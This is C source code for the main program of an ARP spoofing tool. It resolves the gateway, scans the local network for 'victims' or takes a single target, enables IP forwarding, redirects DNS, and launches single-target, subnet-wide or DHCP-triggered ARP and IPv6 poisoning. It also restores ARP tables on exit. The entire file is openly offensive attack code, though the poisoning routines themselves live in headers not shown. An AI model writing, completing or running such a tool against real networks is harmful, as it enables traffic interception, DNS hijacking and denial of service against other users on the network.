#include <arpa/inet.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include "ARP/ARP_UTILS/arp_poison.h"
#include "ARP/ARP_UTILS/arp_scan.h"
#include "ARP/ARP_UTILS/utils_discovery.h"
#include "ARP/ARP_UTILS/utils_iptables.h"
#include "ARP/ARP_UTILS/utils_firewall.h"
#include "ARP/ARP_UTILS/utils_log.h"

int g_victim_count = 0;
struct Victim *g_victims = NULL;
unsigned char g_gateway_ip[4];
unsigned char g_gateway_mac[6];
unsigned char *g_gateway_ipv6_ll = NULL;
unsigned char *g_mac_alloc = NULL;

// Signal-safe flag: handler only sets this, no stdio/malloc/system (#13)
volatile sig_atomic_t g_shutdown_requested = 0;

struct wide_thread_args {
  unsigned char *gateway_ip;
  unsigned char *gateway_mac;
  unsigned char *gateway_ipv6_ll;
};

void *wide_poison_thread(void *arg) {
  struct wide_thread_args *args = (struct wide_thread_args *)arg;
  start_wide_poisoning(args->gateway_ip, args->gateway_mac, args->gateway_ipv6_ll);
  return NULL;
}

// Signal-safe: only sets a flag. All cleanup happens in main after loops exit (#13)
void handle_sigint(int sig) {
  (void)sig;
  g_shutdown_requested = 1;
}

void print_hex_mac(unsigned char *mac) {
  for (int i = 0; i < 6; ++i)
    printf("%02x%c", mac[i], i == 5 ? '\n' : ':');
}

// Centralized cleanup — called once from main after poison loops exit
static void perform_cleanup(void) {
  log_printf("\n[SHUTDOWN] Commencing graceful shutdown...\n");

  if (g_victims && g_victim_count > 0) {
    heal_arp(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac);
  }

  cleanup_dns_redirect();
  cleanup_arp_block();

  if (g_victims) free(g_victims);
  if (g_mac_alloc) free(g_mac_alloc);
  if (g_gateway_ipv6_ll) free(g_gateway_ipv6_ll);

  log_printf("[SHUTDOWN] Cleanup complete.\n");
  log_close();
}

int main(int argc, char *argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  signal(SIGINT, handle_sigint);
  srand(time(NULL)); // Seed RNG once at startup for all modes

  char *victim_ip_str = NULL;
  char *gateway_ip_str = NULL;
  char *log_path = NULL;
  int wide_mode = 0;
  int smart_mode = 0;
  int opt;

  while ((opt = getopt(argc, argv, "t:g:l:wsh")) != -1) {
    switch (opt) {
    case 't': victim_ip_str = optarg; break;
    case 'g': gateway_ip_str = optarg; break;
    case 'l': log_path = optarg; break;  // Log file (#15)
    case 'w': wide_mode = 1; break;
    case 's': smart_mode = 1; break;
    case 'h':
    default:
      fprintf(stderr, "Usage: %s [-t <victim_ip>] [-g <gateway_ip>] [-w] [-s] [-l <logfile>]\n",
              argv[0]);
      fprintf(stderr, "  -t <ip>    Target a specific victim IP.\n");
      fprintf(stderr, "  -g <ip>    Override default gateway IP.\n");
      fprintf(stderr, "  -w         Subnet-Wide Brute Force mode.\n");
      fprintf(stderr, "  -s         Smart DHCP mode.\n");
      fprintf(stderr, "  -l <file>  Log output to file.\n");
      exit(EXIT_FAILURE);
    }
  }

  // Initialize logging (#15)
  if (log_path) {
    log_init(log_path);
    log_printf("[*] Logging to: %s\n", log_path);
  }

  log_printf("[*] Starting ARP Spoofer Engine...\n");

  // 1. Resolve Gateway IP
  if (gateway_ip_str) {
    struct in_addr jw_addr;
    if (inet_pton(AF_INET, gateway_ip_str, &jw_addr) != 1) {
      fprintf(stderr, "Invalid Gateway IP format.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_ip, &jw_addr.s_addr, 4);
    log_printf("[*] Using provided Gateway IP: %d.%d.%d.%d\n",
               g_gateway_ip[0], g_gateway_ip[1],
               g_gateway_ip[2], g_gateway_ip[3]);
  } else {
    log_printf("[*] Discovering default gateway...\n");
    unsigned char *gw_ip_alloc = get_default_gateway_ip();
    if (!gw_ip_alloc) {
      fprintf(stderr, "[!] Failed to discover default gateway.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_ip, gw_ip_alloc, 4);
    free(gw_ip_alloc);
    log_printf("[+] Discovered Gateway IP: %d.%d.%d.%d\n",
               g_gateway_ip[0], g_gateway_ip[1],
               g_gateway_ip[2], g_gateway_ip[3]);
  }

  // 2. Resolve Gateway MAC
  g_mac_alloc = get_mac_from_ip(g_gateway_ip);
  if (!g_mac_alloc) {
    fprintf(stderr, "[!] Failed to resolve Gateway MAC over eth0.\n");
    exit(EXIT_FAILURE);
  }
  memcpy(g_gateway_mac, g_mac_alloc, 6);
  log_printf("[*] Discovered Gateway MAC:  ");
  print_hex_mac(g_gateway_mac);

  // 2.5. Resolve Gateway IPv6 Link-Local
  log_printf("[*] Discovering IPv6 gateway link-local address...\n");
  g_gateway_ipv6_ll = get_gateway_ipv6_ll();
  if (g_gateway_ipv6_ll) {
    char addr_str[INET6_ADDRSTRLEN];
    inet_ntop(AF_INET6, g_gateway_ipv6_ll, addr_str, sizeof(addr_str));
    log_printf("[+] Discovered IPv6 Gateway Address: %s\n", addr_str);
  } else {
    log_printf("[!] Failed to discover IPv6 gateway. IPv6 blocking will be inactive.\n");
  }

  // 3. Resolve Victims
  if (victim_ip_str) {
    log_printf("[*] Using single targeted victim...\n");
    struct in_addr vic_addr;
    if (inet_pton(AF_INET, victim_ip_str, &vic_addr) != 1) {
      fprintf(stderr, "Invalid Target (Victim) IP format.\n");
      exit(EXIT_FAILURE);
    }
    g_victims = malloc(sizeof(struct Victim));
    if (!g_victims) {
      fprintf(stderr, "[!] Failed to allocate memory for victim.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_victims[0].ip, &vic_addr.s_addr, 4);
    unsigned char *v_mac_alloc = get_mac_from_ip(g_victims[0].ip);
    if (!v_mac_alloc) {
      fprintf(stderr, "[!] Failed to resolve Victim MAC for %s over eth0.\n",
              victim_ip_str);
      free(g_victims);
      exit(EXIT_FAILURE);
    }
    memcpy(g_victims[0].mac, v_mac_alloc, 6);
    free(v_mac_alloc);
    g_victim_count = 1;
    log_printf("[+] Found %d victims on the network.\n", g_victim_count);
  } else if (!wide_mode && !smart_mode) {
    log_printf("[*] Discovering network victims...\n");
    g_victims = scan_network(g_gateway_ip, &g_victim_count);
    if (!g_victims || g_victim_count == 0 || g_victim_count > 512) {
      fprintf(stderr, "[!] Failed to scan network or no victims found.\n");
      if (g_mac_alloc) free(g_mac_alloc);
      exit(EXIT_FAILURE);
    }
    log_printf("[+] Found %d victims on the network.\n", g_victim_count);
  }

  // Setup Packet Forwarding and IPTables
  log_printf("[*] Configuring internal packet routing...\n");
  enable_ip_forwarding();
  log_printf("[*] Integrating with Technitium DNS...\n");
  setup_dns_redirect();

  // ARP-Kill Protection
  setup_arp_block(g_gateway_mac, g_victims, g_victim_count);

  // Launch Attack
  log_printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
  log_printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");

  if (smart_mode) {
    log_printf("[*] Concurrent execution: Wide mode thread + Smart Sniffer.\n");
    pthread_t thread_id;
    struct wide_thread_args *args = malloc(sizeof(struct wide_thread_args));
    args->gateway_ip = g_gateway_ip;
    args->gateway_mac = g_gateway_mac;
    args->gateway_ipv6_ll = g_gateway_ipv6_ll;

    if (pthread_create(&thread_id, NULL, wide_poison_thread, args) != 0) {
      perror("Failed to create wide poison thread");
    }

    start_smart_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
    free(args);
  } else if (wide_mode) {
    start_wide_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
  } else {
    start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac,
                    g_gateway_ipv6_ll);
  }

  // Loops exited (g_shutdown_requested was set by SIGINT handler)
  // All cleanup happens here, safely outside the signal handler (#13)
  perform_cleanup();
  return EXIT_SUCCESS;
}
